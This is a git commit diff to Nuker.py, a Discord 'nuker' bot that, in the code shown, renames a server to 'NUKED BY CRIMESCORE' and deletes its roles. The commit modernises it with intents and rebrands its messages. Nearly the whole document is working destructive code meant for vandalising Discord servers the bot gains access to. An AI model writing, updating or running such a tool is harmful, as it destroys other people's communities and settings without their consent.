11644b975c7ff0781443fbcf9cc7fb9616bb92f8
crimescore <97543454+crimescore@users.noreply.github.com>
2023-03-30 14:06:36 -0400

    Update Nuker.py

--- Nuker.py
+++ Nuker.py
@@ -1,13 +1,18 @@
 #Bot created by PurpleProfessional
 #Please do not change the name and claim that the file is yours.
 
-import discord, os, time, logging, json, base64
+import discord
 from discord.ext import commands
-from discord.ext.commands import Bot
+import time
+import logging
+
+intents = discord.Intents.default()
+intents.message_content = True #v2
+intents.members = True 
 
 prefix = ','
 
-client = commands.Bot(command_prefix=prefix, case_insensitive=True)
+client = commands.Bot(command_prefix=prefix, case_insensitive=True, intents=intents)
 
 client.remove_command("help")
 
@@ -16,13 +21,13 @@ async def on_command_error(ctx, error):
     if isinstance(error, commands.CommandNotFound):
         return
     else:
-        raise(error)
+        raise error
 
 @client.event
 async def on_ready():
     print("Nuker Successfully running.")
     print(f"Logged into {len(client.guilds)} servers.")
-    await client.change_presence(activity=discord.Activity(type=discord.ActivityType.listening, name=f"{prefix}help"))
+    await client.change_presence(activity=discord.Activity(type=discord.ActivityType.listening, name=f"crimescores demands"))
 
 @client.event
 async def on_guild_join(server):
@@ -36,7 +41,7 @@ async def n(ctx):
         except Exception as E:
             print(E)
             continue
-    await ctx.guild.edit(name="rekt xd", icon=None, rules_channel=None, public_updates_channel=None, system_channel=None)
+    await ctx.guild.edit(name="NUKED BY CRIMESCORE", icon=None, rules_channel=None, public_updates_channel=None, system_channel=None)
     for role in ctx.guild.roles:
         if not role.position == 0:
             print(role.name)
@@ -44,4 +49,5 @@ async def n(ctx):
                 await role.delete()
             except:
                 continue
+
 client.run("TOKEN HERE")
